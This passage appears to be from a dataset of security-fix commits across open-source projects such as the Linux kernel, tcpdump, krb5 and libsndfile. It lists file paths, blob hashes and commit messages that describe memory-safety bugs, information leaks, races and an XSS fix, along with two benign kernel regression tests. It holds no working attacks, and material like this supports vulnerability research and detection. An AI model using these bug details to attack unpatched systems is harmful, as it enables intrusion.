    adm_config_report.php
Blob(s) In Commit: 
    83149f0e422bcc3b68a986f3ed5a8c8f4c45f348
Blob(s) Before Fix: 
    83149f0e422bcc3b68a986f3ed5a8c8f4c45f348
Projects:
    01-Scripts_mantisbt
Commit Message for cabacdc291c251bfde0dc2a2c945c02cef41bf40:
Fix: adm_config_report.php filtering does not check config option is valid\n\nI've left this throwing ERROR_GENERIC as the only time this should be able to be hit is if we have invalid input to start with.

======================================================================
Commit With Fix: 
    fc3794a54d2affe5770c1f876484a871c783e91e
File(s) In Commit: 
    libclamav/pe.c
Blob(s) In Commit: 
    908f21043994d5d3d0297c8faac6afa3e38c1ba9
Blob(s) Before Fix: 
    908f21043994d5d3d0297c8faac6afa3e38c1ba9
Projects:
    0ca_clamav-devel
Commit Message for fc3794a54d2affe5770c1f876484a871c783e91e:
Merge fix from security/bb11155 branch

======================================================================
Commit With Fix: 
    b0021673ab23249244119bde3c7fcecd4daa4e7f
File(s) In Commit: 
    core/filter_api.php
Blob(s) In Commit: 
    0667996b474e5b2e823c5967ff44af014507b823
Blob(s) Before Fix: 
    0667996b474e5b2e823c5967ff44af014507b823
Projects:
    01-Scripts_mantisbt
Commit Message for b0021673ab23249244119bde3c7fcecd4daa4e7f:
Improve validation for filter sort and direction\n\nFixes #17841

======================================================================
Commit With Fix: 
    0f95d441e4b5d7512cc5c326c8668a120e048eda
File(s) In Commit: 
    print-ppp.c
Blob(s) In Commit: 
    9a983e6179cd282a61b33880cdf650db02c2dc2a
Blob(s) Before Fix: 
    9a983e6179cd282a61b33880cdf650db02c2dc2a
Projects:
    0xmitsurugi_tcpdump
Commit Message for 0f95d441e4b5d7512cc5c326c8668a120e048eda:
Do bounds checking when unescaping PPP.\n\nClean up a const issue while we're at it.

======================================================================
Commit With Fix: 
    99eda421f7ddc27b14e4ac1d2126e5fe41719081
File(s) In Commit: 
    lib/cgraph/scan.l
Blob(s) In Commit: 
    a5872f4a3f618173ef4a580ec4bee5fb64d31710
Blob(s) Before Fix: 
    a5872f4a3f618173ef4a580ec4bee5fb64d31710
Projects:
    Accacio_graphviz
Commit Message for 99eda421f7ddc27b14e4ac1d2126e5fe41719081:
Fix format string vulnerability in using agerr() to report errors during parsing. We now use a fixed format %s, and pass the error string as an argument.

======================================================================
Commit With Fix: 
    778ddf6f2cd9ed38b9db2d73e823b8c21243a960
File(s) In Commit: 
    conf/mime.conf
Blob(s) In Commit: 
    c2e03b775de1a2f2b93dce41f9eaa7d3414fe93f
Blob(s) Before Fix: 
    c2e03b775de1a2f2b93dce41f9eaa7d3414fe93f
Projects:
    122800_dokuwiki
Commit Message for 778ddf6f2cd9ed38b9db2d73e823b8c21243a960:
disable flash uploading by default\n\nThanks to Kacper Szurek for reporting this

======================================================================
Commit With Fix: 
    a766cb44bcffcdb0b88e776d01c5ee1323d44f85
File(s) In Commit: 
    src/engine/server/server.cpp
Blob(s) In Commit: 
    ab0f31225001b6ca1ae6195463c20dc464a2e860
Blob(s) Before Fix: 
    ab0f31225001b6ca1ae6195463c20dc464a2e860
Projects:
    0xFaulty_ddnet
Commit Message for a766cb44bcffcdb0b88e776d01c5ee1323d44f85:
fixed a server crash

======================================================================
Commit With Fix: 
    f647d7c155f069c1a068030255c300663516420e
File(s) In Commit: 
    arch/x86/kernel/process_64.c
Blob(s) In Commit: 
    5a2c02913af3bd43dfc1be40947f176e0542422f
Blob(s) Before Fix: 
    5a2c02913af3bd43dfc1be40947f176e0542422f
Projects:
    0-T-0_ps4-linux
Commit Message for f647d7c155f069c1a068030255c300663516420e:
x86_64, switch_to(): Load TLS descriptors before switching DS and ES\n\nOtherwise, if buggy user code points DS or ES into the TLS array, they would be corrupted after a context switch.\n\nThis also significantly improves the comments and documents some gotchas in the code.\n\nBefore this patch, the both tests below failed.  With this patch, the es test passes, although the gsbase test still fails.\n\n ----- begin es test -----\n\n/*  * Copyright (c) 2014 Andy Lutomirski  * GPL v2  */\n\nstatic unsigned short GDT3(int idx) { 	return (idx << 3) | 3  }\n\nstatic int create_tls(int idx, unsigned int base) { 	struct user_desc desc = { 		.entry_number    = idx, 		.base_addr       = base, 		.limit           = 0xfffff, 		.seg_32bit       = 1, 		.contents        = 0, /* Data, grow-up */ 		.read_exec_only  = 0, 		.limit_in_pages  = 1, 		.seg_not_present = 0, 		.useable         = 0, 	} \n\n	if (syscall(SYS_set_thread_area, &desc) != 0) 		err(1, "set_thread_area") \n\n	return desc.entry_number  }\n\nint main() { 	int idx = create_tls(-1, 0)  	printf("Allocated GDT index %d\n", idx) \n\n	unsigned short orig_es  	asm volatile ("mov %%es,%0" : "=rm" (orig_es)) \n\n	int errors = 0  	int total = 1000  	for (int i = 0  i < total  i++) { 		asm volatile ("mov %0,%%es" : : "rm" (GDT3(idx)))  		usleep(100) \n\n		unsigned short es  		asm volatile ("mov %%es,%0" : "=rm" (es))  		asm volatile ("mov %0,%%es" : : "rm" (orig_es))  		if (es != GDT3(idx)) { 			if (errors == 0) 				printf("[FAIL]\tES changed from 0x%hx to 0x%hx\n", 				       GDT3(idx), es)  			errors++  		} 	}\n\n	if (errors) { 		printf("[FAIL]\tES was corrupted %d/%d times\n", errors, total)  		return 1  	} else { 		printf("[OK]\tES was preserved\n")  		return 0  	} }\n\n ----- end es test -----\n\n ----- begin gsbase test -----\n\n/*  * gsbase.c, a gsbase test  * Copyright (c) 2014 Andy Lutomirski  * GPL v2  */\n\nstatic unsigned char *testptr, *testptr2 \n\nstatic unsigned char read_gs_testvals(void) { 	unsigned char ret  	asm volatile ("movb %%gs:%1, %0" : "=r" (ret) : "m" (*testptr))  	return ret  }\n\nint main() { 	int errors = 0 \n\n	testptr = mmap((void *)0x200000000UL, 1, PROT_READ | PROT_WRITE, 		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)  	if (testptr == MAP_FAILED) 		err(1, "mmap") \n\n	testptr2 = mmap((void *)0x300000000UL, 1, PROT_READ | PROT_WRITE, 		       MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0)  	if (testptr2 == MAP_FAILED) 		err(1, "mmap") \n\n	*testptr = 0  	*testptr2 = 1 \n\n	if (syscall(SYS_arch_prctl, ARCH_SET_GS, 		    (unsigned long)testptr2 - (unsigned long)testptr) != 0) 		err(1, "ARCH_SET_GS") \n\n	usleep(100) \n\n	if (read_gs_testvals() == 1) { 		printf("[OK]\tARCH_SET_GS worked\n")  	} else { 		printf("[FAIL]\tARCH_SET_GS failed\n")  		errors++  	}\n\n	asm volatile ("mov %0,%%gs" : : "r" (0)) \n\n	if (read_gs_testvals() == 0) { 		printf("[OK]\tWriting 0 to gs worked\n")  	} else { 		printf("[FAIL]\tWriting 0 to gs failed\n")  		errors++  	}\n\n	usleep(100) \n\n	if (read_gs_testvals() == 0) { 		printf("[OK]\tgsbase is still zero\n")  	} else { 		printf("[FAIL]\tgsbase was corrupted\n")  		errors++  	}\n\n	return errors == 0 ? 0 : 1  }\n\n ----- end gsbase test -----\n\nSigned-off-by: Andy Lutomirski <luto@amacapital.net> Cc: <stable@vger.kernel.org> Cc: Andi Kleen <andi@firstfloor.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Link: http://lkml.kernel.org/r/509d27c9fec78217691c3dad91cec87e1006b34a.1418075657.git.luto@amacapital.net Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f54e18f1b831c92f6512d2eedb224cd63d607d3d
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    bb63254ed8486f42200230b4bbaa80257f92700d
Blob(s) Before Fix: 
    bb63254ed8486f42200230b4bbaa80257f92700d
Projects:
    0-T-0_ps4-linux
Commit Message for f54e18f1b831c92f6512d2eedb224cd63d607d3d:
isofs: Fix infinite looping over CE entries\n\nRock Ridge extensions define so called Continuation Entries (CE) which define where is further space with Rock Ridge data. Corrupted isofs image can contain arbitrarily long chain of these, including a one containing loop and thus causing kernel to end in an infinite loop when traversing these entries.\n\nLimit the traversal to 32 entries which should be more than enough space to store all the Rock Ridge data.\n\nReported-by: P J P <ppandit@redhat.com> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    6609658db0799053fbef0d7d0aa2f1fd68ef32d8
File(s) In Commit: 
    src/kadmin/server/kadm_rpc_svc.c
Blob(s) In Commit: 
    f4d2a7cba7b4c5b6de0479ab8dbbe30e097aee24
Blob(s) Before Fix: 
    f4d2a7cba7b4c5b6de0479ab8dbbe30e097aee24
Projects:
    3van_krb5
Commit Message for 6609658db0799053fbef0d7d0aa2f1fd68ef32d8:
Fix kadmind server validation [CVE-2014-9422]\n\n[MITKRB5-SA-2015-001] In kadmind's check_rpcsec_auth(), use data_eq_string() instead of strncmp() to check components of the server principal, so that we don't erroneously match left substrings of "kadmin", "history", or the realm.\n\nticket: 8057 (new) target_version: 1.13.1 tags: pullup

======================================================================
Commit With Fix: 
    62a110d447bb8c16a4c69629e28a42e8c39fd7e0
File(s) In Commit: 
    src/ssl/d1_srtp.c
Blob(s) In Commit: 
    98a6bd9e247c8116e2a1cdfd2a431314857dcfaa
Blob(s) Before Fix: 
    98a6bd9e247c8116e2a1cdfd2a431314857dcfaa
Projects:
    PeterN_libssl
Commit Message for 62a110d447bb8c16a4c69629e28a42e8c39fd7e0:
Avoid a double-free in an error path.\n\nReported by Felix Groebert of the Google Security Team.\n\nok beck@ miod@

======================================================================
Commit With Fix: 
    5b6698b0e4a37053de35cc24ee695b98a7eb712b
File(s) In Commit: 
    net/batman-adv/fragmentation.c
Blob(s) In Commit: 
    8af3461d18d26abc26955acb814fd205d123eb2b
Blob(s) Before Fix: 
    8af3461d18d26abc26955acb814fd205d123eb2b
Projects:
    0-T-0_ps4-linux
Commit Message for 5b6698b0e4a37053de35cc24ee695b98a7eb712b:
batman-adv: Calculate extra tail size based on queued fragments\n\nThe fragmentation code was replaced in 610bfc6bc99bc83680d190ebc69359a05fc7f605 ("batman-adv: Receive fragmented packets and merge"). The new code provided a mostly unused parameter skb for the merging function. It is used inside the function to calculate the additionally needed skb tailroom. But instead of increasing its own tailroom, it is only increasing the tailroom of the first queued skb. This is not correct in some situations because the first queued entry can be a different one than the parameter.\n\nAn observed problem was:\n\n1. packet with size 104, total_size 1464, fragno 1 was received    - packet is queued 2. packet with size 1400, total_size 1464, fragno 0 was received    - packet is queued at the end of the list 3. enough data was received and can be given to the merge function    (1464 == (1400 - 20) + (104 - 20))    - merge functions gets 1400 byte large packet as skb argument 4. merge function gets first entry in queue (104 byte)    - stored as skb_out 5. merge function calculates the required extra tail as total_size - skb->len    - pskb_expand_head tail of skb_out with 64 bytes 6. merge function tries to squeeze the extra 1380 bytes from the second queued    skb (1400 byte aka skb parameter) in the 64 extra tail bytes of skb_out\n\nInstead calculate the extra required tail bytes for skb_out also using skb_out instead of using the parameter skb. The skb parameter is only used to get the total_size from the last received packet. This is also the total_size used to decide that all fragments were received.\n\nReported-by: Philipp Psurek <philipp.psurek@gmail.com> Signed-off-by: Sven Eckelmann <sven@narfation.org> Acked-by: Martin Hundebøll <martin@hundeboll.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4520d973c81fecfebbeacd2ef2f1849d763951c7
File(s) In Commit: 
    lib/grit_adapter/git_layer_grit.rb
Blob(s) In Commit: 
    e677ca6e9db20b27f45bf54ff3cda0f1260635bd
Blob(s) Before Fix: 
    e677ca6e9db20b27f45bf54ff3cda0f1260635bd
Projects:
    gollum_grit_adapter
Commit Message for 4520d973c81fecfebbeacd2ef2f1849d763951c7:
Fix security issue with git grep -O

======================================================================
Commit With Fix: 
    d65686849024838243515b5c40ae2c479460b4b5
File(s) In Commit: 
    usr/src/uts/common/fs/dev/sdev_zvolops.c
Blob(s) In Commit: 
    e4c3acf78712a6863e3eca926445303b5fb5db36
Blob(s) Before Fix: 
    e4c3acf78712a6863e3eca926445303b5fb5db36
Projects:
    0rbiter_zfs
Commit Message for d65686849024838243515b5c40ae2c479460b4b5:
5421 devzvol_readdir() needs to be more careful with strchr Reviewed by: Keith Wesolowski <keith.wesolowski@joyent.com> Reviewed by: Jerry Jelinek <jerry.jelinek@joyent.com> Approved by: Dan McDonald <danmcd@omniti.com>

======================================================================
Commit With Fix: 
    dbe14f00030af5d3577f4cabbf9861db59e9c378
File(s) In Commit: 
    src/sd2.c
Blob(s) In Commit: 
    a70a1f149b97181f7b20d10d30b6c1c972bab0c9
Blob(s) Before Fix: 
    a70a1f149b97181f7b20d10d30b6c1c972bab0c9
Projects:
    12gjang_libsndfile
Commit Message for dbe14f00030af5d3577f4cabbf9861db59e9c378:
src/sd2.c : Fix two potential buffer read overflows.\n\nCloses: https://github.com/erikd/libsndfile/issues/93

======================================================================
Commit With Fix: 
    a3a8784454692dd72e5d5d34dcdab17b4420e74c
File(s) In Commit: 
    security/keys/gc.c
Blob(s) In Commit: 
    c7952375ac5325cfb4c403fa1020671b5f31a150
Blob(s) Before Fix: 
    c7952375ac5325cfb4c403fa1020671b5f31a150
Projects:
    0-T-0_ps4-linux
Commit Message for a3a8784454692dd72e5d5d34dcdab17b4420e74c:
KEYS: close race between key lookup and freeing\n\nWhen a key is being garbage collected, it's key->user would get put before the ->destroy() callback is called, where the key is removed from it's respective tracking structures.\n\nThis leaves a key hanging in a semi-invalid state which leaves a window open for a different task to try an access key->user. An example is find_keyring_by_name() which would dereference key->user for a key that is in the process of being garbage collected (where key->user was freed but ->destroy() wasn't called yet - so it's still present in the linked list).\n\nThis would cause either a panic, or corrupt memory.\n\nFixes CVE-2014-9529.\n\nSigned-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David Howells <dhowells@redhat.com>

======================================================================
Commit With Fix: 
    4e2024624e678f0ebb916e6192bd23c1f9fdf696
File(s) In Commit: 
    fs/isofs/rock.c
Blob(s) In Commit: 
    735d7522a3a911f19af593d6b5f7d366d6cf448d
Blob(s) Before Fix: 
    735d7522a3a911f19af593d6b5f7d366d6cf448d
Projects:
    0-T-0_ps4-linux
Commit Message for 4e2024624e678f0ebb916e6192bd23c1f9fdf696:
isofs: Fix unchecked printing of ER records\n\nWe didn't check length of rock ridge ER records before printing them. Thus corrupted isofs image can cause us to access and print some memory behind the buffer with obvious consequences.\n\nReported-and-tested-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    65437cee25199dbd385fb35901bc0011e164276c
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    cd1f79d5ffd2417dac80fd7396a9dbae38a4e5d7
Blob(s) Before Fix: 
    cd1f79d5ffd2417dac80fd7396a9dbae38a4e5d7
Projects:
    5hadowblad3_file
Commit Message for 65437cee25199dbd385fb35901bc0011e164276c:
Limit string printing to 100 chars, and add flags I forgot in the previous commit.

======================================================================
Commit With Fix: 
    59e63838913eee47f5c120a6c53d4565af638158
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    2b15f2c39e73c9079964e2195e26b632ca11693b
Blob(s) Before Fix: 
    2b15f2c39e73c9079964e2195e26b632ca11693b
Projects:
    5hadowblad3_file
Commit Message for 59e63838913eee47f5c120a6c53d4565af638158:
PR/398: Correctly truncate pascal strings (fixes out of bounds read of 1, 2, or 4 bytes).

======================================================================
Commit With Fix: 
    445c8fb0ebff85195be94cd9f7e1df89cade5c7f
File(s) In Commit: 
    src/readelf.c
Blob(s) In Commit: 
    9d54fc973b51e3bcb03bfc28eefa472d9330936a
Blob(s) Before Fix: 
    9d54fc973b51e3bcb03bfc28eefa472d9330936a
Projects:
    5hadowblad3_file
Commit Message for 445c8fb0ebff85195be94cd9f7e1df89cade5c7f:
Bail out on partial reads, from Alexander Cherepanov

======================================================================
Commit With Fix: 
    942080643bce061c3dd9d5718d3b745dcb39a8bc
File(s) In Commit: 
    fs/ecryptfs/crypto.c
Blob(s) In Commit: 
    31b148f3e7729d69ab3ee26639d8e68193243c73
Blob(s) Before Fix: 
    31b148f3e7729d69ab3ee26639d8e68193243c73
Projects:
    0-T-0_ps4-linux
Commit Message for 942080643bce061c3dd9d5718d3b745dcb39a8bc:
eCryptfs: Remove buggy and unnecessary write in file name decode routine\n\nDmitry Chernenkov used KASAN to discover that eCryptfs writes past the end of the allocated buffer during encrypted filename decoding. This fix corrects the issue by getting rid of the unnecessary 0 write when the current bit offset is 2.\n\nSigned-off-by: Michael Halcrow <mhalcrow@google.com> Reported-by: Dmitry Chernenkov <dmitryc@google.com> Suggested-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org # v2.6.29+: 51ca58d eCryptfs: Filename Encryption: Encoding and encryption functions Signed-off-by: Tyler Hicks <tyhicks@canonical.com>

======================================================================
Commit With Fix: 
    223b02d923ecd7c84cf9780bb3686f455d279279
File(s) In Commit: 
    include/net/netfilter/nf_conntrack_extend.h
Blob(s) In Commit: 
    55d15049ab2fd60626bb4a5305baf6df5978c791
Blob(s) Before Fix: 
    55d15049ab2fd60626bb4a5305baf6df5978c791
Projects:
    0-T-0_ps4-linux
Commit Message for 223b02d923ecd7c84cf9780bb3686f455d279279:
netfilter: nf_conntrack: reserve two bytes for nf_ct_ext->len\n\n"len" contains sizeof(nf_ct_ext) and size of extensions. In a worst case it can contain all extensions. Bellow you can find sizes for all types of extensions. Their sum is definitely bigger than 256.\n\nnf_ct_ext_types[0]->len = 24 nf_ct_ext_types[1]->len = 32 nf_ct_ext_types[2]->len = 24 nf_ct_ext_types[3]->len = 32 nf_ct_ext_types[4]->len = 152 nf_ct_ext_types[5]->len = 2 nf_ct_ext_types[6]->len = 16 nf_ct_ext_types[7]->len = 8\n\nI have seen "len" up to 280 and my host has crashes w/o this patch.\n\nThe right way to fix this problem is reducing the size of the ecache extension (4) and Florian is going to do this, but these changes will be quite large to be appropriate for a stable tree.\n\nFixes: 5b423f6a40a0 (netfilter: nf_conntrack: fix racy timer handling with reliable) Cc: Pablo Neira Ayuso <pablo@netfilter.org> Cc: Patrick McHardy <kaber@trash.net> Cc: Jozsef Kadlecsik <kadlec@blackhole.kfki.hu> Cc: "David S. Miller" <davem@davemloft.net> Signed-off-by: Andrey Vagin <avagin@openvz.org> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    e159332b9af4b04d882dbcfe1bb0117f0a6d4b58
File(s) In Commit: 
    fs/udf/inode.c
Blob(s) In Commit: 
    5bc71d9a674a7e5dfc3ff882ee61a2591a328c7b
Blob(s) Before Fix: 
    5bc71d9a674a7e5dfc3ff882ee61a2591a328c7b
Projects:
    0-T-0_ps4-linux
Commit Message for e159332b9af4b04d882dbcfe1bb0117f0a6d4b58:
udf: Verify i_size when loading inode\n\nVerify that inode size is sane when loading inode with data stored in ICB. Otherwise we may get confused later when working with the inode and inode size is too big.\n\nCC: stable@vger.kernel.org Reported-by: Carl Henrik Lunde <chlunde@ping.uio.no> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    e237ec37ec154564f8690c5bd1795339955eeef9
File(s) In Commit: 
    fs/udf/symlink.c
Blob(s) In Commit: 
    ac10ca939f267283ba0f64da9d4ec82de0eeeb61
Blob(s) Before Fix: 
    ac10ca939f267283ba0f64da9d4ec82de0eeeb61
Projects:
    0-T-0_ps4-linux
Commit Message for e237ec37ec154564f8690c5bd1795339955eeef9:
udf: Check component length before reading it\n\nCheck that length specified in a component of a symlink fits in the input buffer we are reading. Also properly ignore component length for component types that do not use it. Otherwise we read memory after end of buffer for corrupted udf image.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6
File(s) In Commit: 
    src/file_io.c
Blob(s) In Commit: 
    6ccab78ea805b2e9e68fbb5cd844aae24c128980
Blob(s) Before Fix: 
    6ccab78ea805b2e9e68fbb5cd844aae24c128980
Projects:
    12gjang_libsndfile
Commit Message for 725c7dbb95bfaf8b4bb7b04820e3a00cceea9ce6:
src/file_io.c : Prevent potential divide-by-zero.\n\nCloses: https://github.com/erikd/libsndfile/issues/92

======================================================================
Commit With Fix: 
    e35b990464a2c2cf64d6833a217ed944876e7732
File(s) In Commit: 
    html/index.php
Blob(s) In Commit: 
    ab83e113f09536a62123c09e5b447724b11669d4
Blob(s) Before Fix: 
    ab83e113f09536a62123c09e5b447724b11669d4
Projects:
    Maaici_gosa-core
Commit Message for e35b990464a2c2cf64d6833a217ed944876e7732:
escape html entities to fix xss at the login screen\n\n git-svn-id: https://oss.gonicus.de/repositories/gosa/trunk@21276 594d385d-05f5-0310-b6e9-bd551577e9d8

======================================================================
Commit With Fix: 
    c597156adc60a45b5f827793cd420945f47bc03b
File(s) In Commit: 
    modules/chanserv/flags.c
Blob(s) In Commit: 
    72d8fcfbd390dc4784f176af7a57b4cfa04d28c8
Blob(s) Before Fix: 
    72d8fcfbd390dc4784f176af7a57b4cfa04d28c8
Projects:
    Acidburn0zzz_atheme
Commit Message for c597156adc60a45b5f827793cd420945f47bc03b:
chanserv/flags: make Anope FLAGS compatibility an option\n\nPreviously, ChanServ FLAGS behavior could be modified by registering or dropping the keyword nicks "LIST", "CLEAR", and "MODIFY". Now, a configuration option is available that when turned on (default), disables registration of these keyword nicks and enables this compatibility feature. When turned off, registration of these keyword nicks is possible, and compatibility to Anope's FLAGS command is disabled.\n\nFixes atheme/atheme#397

======================================================================
Commit With Fix: 
    0ea1ec713f04bdfac343c9702b21cd3a7c711826
File(s) In Commit: 
    arch/arm/mm/dma-mapping.c
Blob(s) In Commit: 
    57438506d52461aaac70c12f6cd9a2b4384b6e34
Blob(s) Before Fix: 
    57438506d52461aaac70c12f6cd9a2b4384b6e34
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0ea1ec713f04bdfac343c9702b21cd3a7c711826:
ARM: dma-mapping: don't allow DMA mappings to be marked executable\n\nDMA mapping permissions were being derived from pgprot_kernel directly without using PAGE_KERNEL.  This causes them to be marked with executable permission, which is not what we want.  Fix this.\n\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    c88e739b1fad662240e99ecbd0bdaac871717987
File(s) In Commit: 
    drivers/media/media-device.c
Blob(s) In Commit: 
    d5a7a135f75d39d5bc2f6fb3366639dd6dc7ee34
Blob(s) Before Fix: 
    d5a7a135f75d39d5bc2f6fb3366639dd6dc7ee34
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c88e739b1fad662240e99ecbd0bdaac871717987:
[media] media: info leak in __media_device_enum_links()\n\nThese structs have holes and reserved struct members which aren't cleared.  I've added a memset() so we don't leak stack information.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>

======================================================================
Commit With Fix: 
    4efbc454ba68def5ef285b26ebfcfdb605b52755
File(s) In Commit: 
    kernel/sched/core.c
Blob(s) In Commit: 
    a6e7470166c7e6ad19fdef5ba7e359fa98a00c8a
Blob(s) Before Fix: 
    a6e7470166c7e6ad19fdef5ba7e359fa98a00c8a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4efbc454ba68def5ef285b26ebfcfdb605b52755:
sched: Fix information leak in sys_sched_getattr()\n\nWe're copying the on-stack structure to userspace, but forgot to give the right number of bytes to copy. This allows the calling process to obtain up to PAGE_SIZE bytes from the stack (and possibly adjacent kernel memory).\n\nThis fix copies only as much as we actually have on the stack (attr->size defaults to the size of the struct) and leaves the rest of the userspace-provided buffer untouched.\n\nFound using kmemcheck + trinity.\n\nFixes: d50dde5a10f30 ("sched: Add new scheduler syscalls to support an extended scheduling parameters ABI") Cc: Dario Faggioli <raistlin@linux.it> Cc: Juri Lelli <juri.lelli@gmail.com> Cc: Ingo Molnar <mingo@kernel.org> Signed-off-by: Vegard Nossum <vegard.nossum@oracle.com> Signed-off-by: Peter Zijlstra <peterz@infradead.org> Link: http://lkml.kernel.org/r/1392585857-10725-1-git-send-email-vegard.nossum@oracle.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>

======================================================================
Commit With Fix: 
    6217e5ede23285ddfee10d2e4ba0cc2d4c046205
File(s) In Commit: 
    sound/core/compress_offload.c
Blob(s) In Commit: 
    89028fab64fdd27bd75698e651fdc3b26b424941
Blob(s) Before Fix: 
    89028fab64fdd27bd75698e651fdc3b26b424941
Projects:
    0-T-0_ps4-linux
Commit Message for 6217e5ede23285ddfee10d2e4ba0cc2d4c046205:
ALSA: compress: fix an integer overflow check\n\nI previously added an integer overflow check here but looking at it now, it's still buggy.\n\nThe bug happens in snd_compr_allocate_buffer().  We multiply ".fragments" and ".fragment_size" and that doesn't overflow but then we save it in an unsigned int so it truncates the high bits away and we allocate a smaller than expected size.\n\nFixes: b35cc8225845 ('ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()') Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    a56ae87a4c1c1fead7d09c3653905841ccccf1cc
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    bcb35f0c334b1db40d2302fbef1cd2e02847dec1
Blob(s) Before Fix: 
    bcb35f0c334b1db40d2302fbef1cd2e02847dec1
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for a56ae87a4c1c1fead7d09c3653905841ccccf1cc:
fix use-after-free crash in RT #97625

======================================================================
Commit With Fix: 
    9709674e68646cee5a24e3000b3558d25412203a
File(s) In Commit: 
    net/ipv4/datagram.c
Blob(s) In Commit: 
    a3095fdefbed98ed4e320ac6c44ea3e18241d1a4
Blob(s) Before Fix: 
    a3095fdefbed98ed4e320ac6c44ea3e18241d1a4
Projects:
    0-T-0_ps4-linux
Commit Message for 9709674e68646cee5a24e3000b3558d25412203a:
ipv4: fix a race in ip4_datagram_release_cb()\n\nAlexey gave a AddressSanitizer[1] report that finally gave a good hint at where was the origin of various problems already reported by Dormando in the past [2]\n\nProblem comes from the fact that UDP can have a lockless TX path, and concurrent threads can manipulate sk_dst_cache, while another thread, is holding socket lock and calls __sk_dst_set() in ip4_datagram_release_cb() (this was added in linux-3.8)\n\nIt seems that all we need to do is to use sk_dst_check() and sk_dst_set() so that all the writers hold same spinlock (sk->sk_dst_lock) to prevent corruptions.\n\nTCP stack do not need this protection, as all sk_dst_cache writers hold the socket lock.\n\n[1] https://code.google.com/p/address-sanitizer/wiki/AddressSanitizerForKernel\n\nAddressSanitizer: heap-use-after-free in ipv4_dst_check Read of size 2 by thread T15453:  [<ffffffff817daa3a>] ipv4_dst_check+0x1a/0x90 ./net/ipv4/route.c:1116  [<ffffffff8175b789>] __sk_dst_check+0x89/0xe0 ./net/core/sock.c:531  [<ffffffff81830a36>] ip4_datagram_release_cb+0x46/0x390 ??:0  [<ffffffff8175eaea>] release_sock+0x17a/0x230 ./net/core/sock.c:2413  [<ffffffff81830882>] ip4_datagram_connect+0x462/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\nFreed by thread T15455:  [<ffffffff8178d9b8>] dst_destroy+0xa8/0x160 ./net/core/dst.c:251  [<ffffffff8178de25>] dst_release+0x45/0x80 ./net/core/dst.c:280  [<ffffffff818304c1>] ip4_datagram_connect+0xa1/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\nAllocated by thread T15453:  [<ffffffff8178d291>] dst_alloc+0x81/0x2b0 ./net/core/dst.c:171  [<ffffffff817db3b7>] rt_dst_alloc+0x47/0x50 ./net/ipv4/route.c:1406  [<     inlined    >] __ip_route_output_key+0x3e8/0xf70 __mkroute_output ./net/ipv4/route.c:1939  [<ffffffff817dde08>] __ip_route_output_key+0x3e8/0xf70 ./net/ipv4/route.c:2161  [<ffffffff817deb34>] ip_route_output_flow+0x14/0x30 ./net/ipv4/route.c:2249  [<ffffffff81830737>] ip4_datagram_connect+0x317/0x5d0 ??:0  [<ffffffff81846d06>] inet_dgram_connect+0x76/0xd0 ./net/ipv4/af_inet.c:534  [<ffffffff817580ac>] SYSC_connect+0x15c/0x1c0 ./net/socket.c:1701  [<ffffffff817596ce>] SyS_connect+0xe/0x10 ./net/socket.c:1682  [<ffffffff818b0a29>] system_call_fastpath+0x16/0x1b ./arch/x86/kernel/entry_64.S:629\n\n[2] <4>[196727.311203] general protection fault: 0000 [#1] SMP <4>[196727.311224] Modules linked in: xt_TEE xt_dscp xt_DSCP macvlan bridge coretemp crc32_pclmul ghash_clmulni_intel gpio_ich microcode ipmi_watchdog ipmi_devintf sb_edac edac_core lpc_ich mfd_core tpm_tis tpm tpm_bios ipmi_si ipmi_msghandler isci igb libsas i2c_algo_bit ixgbe ptp pps_core mdio <4>[196727.311333] CPU: 17 PID: 0 Comm: swapper/17 Not tainted 3.10.26 #1 